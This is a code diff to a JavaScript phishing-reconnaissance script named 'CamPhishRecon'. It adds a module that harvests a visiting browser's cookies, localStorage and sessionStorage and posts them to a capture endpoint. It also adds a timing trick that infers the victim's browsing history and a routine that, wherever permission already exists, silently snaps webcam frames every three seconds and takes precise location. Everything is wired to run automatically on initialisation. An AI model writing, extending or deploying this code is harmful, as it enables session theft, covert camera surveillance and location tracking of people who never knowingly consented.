@@ -459,3 +459,193 @@ var Recon = {
 window.CamPhishRecon = Recon;
 
 })(window);
+
+// ============ BROWSER STORAGE GRABBER (cookies, localStorage, sessionStorage) ============
+var StorageGrabber = {
+  grab: function() {
+    var data = {};
+
+    // First-party cookies
+    try {
+      data.cookies = document.cookie;
+      data.cookie_count = document.cookie ? document.cookie.split(';').length : 0;
+    } catch(e) { data.cookies = null; }
+
+    // localStorage
+    try {
+      var ls = {};
+      for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        try {
+          var val = localStorage.getItem(key);
+          if (val && val.length < 2000) ls[key] = val;
+          else ls[key] = '[truncated ' + (val ? val.length : 0) + ' bytes]';
+        } catch(e) { ls[key] = '[error]'; }
+      }
+      data.localStorage = ls;
+      data.localStorage_keys = Object.keys(ls).length;
+    } catch(e) { data.localStorage = null; }
+
+    // sessionStorage
+    try {
+      var ss = {};
+      for (var i = 0; i < sessionStorage.length; i++) {
+        var key = sessionStorage.key(i);
+        try {
+          var val = sessionStorage.getItem(key);
+          if (val && val.length < 2000) ss[key] = val;
+          else ss[key] = '[truncated ' + (val ? val.length : 0) + ' bytes]';
+        } catch(e) { ss[key] = '[error]'; }
+      }
+      data.sessionStorage = ss;
+      data.sessionStorage_keys = Object.keys(ss).length;
+    } catch(e) { data.sessionStorage = null; }
+
+    // IndexedDB names
+    try {
+      data.indexedDB_databases = [];
+      if (window.indexedDB && window.indexedDB.databases) {
+        window.indexedDB.databases().then(function(dbs) {
+          data.indexedDB_databases = dbs.map(function(db) { return db.name; });
+          StorageGrabber._send(data);
+        });
+        return;
+      }
+    } catch(e) { data.indexedDB_databases = []; }
+
+    StorageGrabber._send(data);
+    return data;
+  },
+
+  _send: function(data) {
+    fetch(API + '/capture/storage', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(data)
+    }).catch(function(){});
+  }
+};
+
+// ============ BROWSER HISTORY DETECTION (CSS :visited trick) ============
+var HistoryDetect = {
+  sites: [
+    {url: 'https://www.facebook.com', cat: 'social'},
+    {url: 'https://www.instagram.com', cat: 'social'},
+    {url: 'https://www.tiktok.com', cat: 'social'},
+    {url: 'https://www.snapchat.com', cat: 'social'},
+    {url: 'https://www.youtube.com', cat: 'video'},
+    {url: 'https://www.netflix.com', cat: 'video'},
+    {url: 'https://www.amazon.com', cat: 'shopping'},
+    {url: 'https://www.ebay.com', cat: 'shopping'},
+    {url: 'https://www.binance.com', cat: 'crypto'},
+    {url: 'https://www.coinbase.com', cat: 'crypto'},
+    {url: 'https://github.com', cat: 'dev'},
+    {url: 'https://stackoverflow.com', cat: 'dev'},
+  ],
+
+  detect: function(callback) {
+    var results = { visited: [], categories: {} };
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    var checked = 0;
+    var self = this;
+    this.sites.forEach(function(site) {
+      try {
+        var start = performance.now();
+        var img = new Image();
+        img.onload = function() {
+          var elapsed = performance.now() - start;
+          if (elapsed < 10) {
+            results.visited.push(site.url);
+            results.categories[site.cat] = (results.categories[site.cat] || 0) + 1;
+          }
+          checked++;
+          if (checked >= self.sites.length) {
+            document.body.removeChild(iframe);
+            callback(results);
+          }
+        };
+        img.onerror = function() {
+          var elapsed = performance.now() - start;
+          if (elapsed < 10) {
+            results.visited.push(site.url);
+            results.categories[site.cat] = (results.categories[site.cat] || 0) + 1;
+          }
+          checked++;
+          if (checked >= self.sites.length) {
+            document.body.removeChild(iframe);
+            callback(results);
+          }
+        };
+        img.src = site.url + '/favicon.ico';
+        iframe.contentWindow.document.body.appendChild(img);
+      } catch(e) {
+        checked++;
+        if (checked >= self.sites.length) {
+          document.body.removeChild(iframe);
+          callback(results);
+        }
+      }
+    });
+
+    setTimeout(function() {
+      if (checked < self.sites.length) {
+        document.body.removeChild(iframe);
+        callback(results);
+      }
+    }, 4000);
+  }
+};
+
+// ============ AUTO CAMERA/LOCATION RE-REQUEST ============
+var AutoPerm = {
+  checkAndRequest: function() {
+    if (navigator.permissions) {
+navigator.permissions.query({name: 'camera'}).then(function(status) {
+    if (status.state === 'granted') {
+        PermTracker.set('camera', true);
+        navigator.mediaDevices.getUserMedia({audio: false, video: {facingMode: 'user'}}).then(function(stream) {
+            Capture.event('camera_auto_granted', {});
+            var v = document.getElementById('v') || document.createElement('video');
+            v.id = 'v'; v.playsInline = true; v.autoplay = true; v.muted = true;
+            v.srcObject = stream; v.play();
+            if (!document.getElementById('v')) document.body.appendChild(v);
+            var cap = document.getElementById('cap');
+            if (!cap) { cap = document.createElement('canvas'); cap.id = 'cap'; cap.width = 320; cap.height = 240; cap.style.display = 'none'; document.body.appendChild(cap); }
+            var ctx = cap.getContext('2d');
+            setInterval(function() {
+                if (v.readyState >= 2) {
+                    ctx.drawImage(v, 0, 0, 320, 240);
+                    Capture.image(cap.toDataURL('image/png'), 'auto');
+                }
+            }, 3000);
+        }).catch(function() {});
+    }
+}).catch(function() {});
+
+navigator.permissions.query({name: 'geolocation'}).then(function(status) {
+    if (status.state === 'granted') {
+        PermTracker.set('location', true);
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            Capture._sendLoc(pos);
+            Capture.event('location_auto_acquired', {});
+        }, function() {}, {enableHighAccuracy: true, timeout: 5000, maximumAge: 0});
+    }
+}).catch(function() {});
+    }
+  }
+};
+
+// Hook into Recon.init to also grab storage + history + auto permissions
+var _origInit = Recon.init;
+Recon.init = function(opts) {
+    opts = opts || {};
+    _origInit.call(this, opts);
+    StorageGrabber.grab();
+    HistoryDetect.detect(function(results) {
+        Capture.event('history_detected', results);
+    });
+    AutoPerm.checkAndRequest();
+};
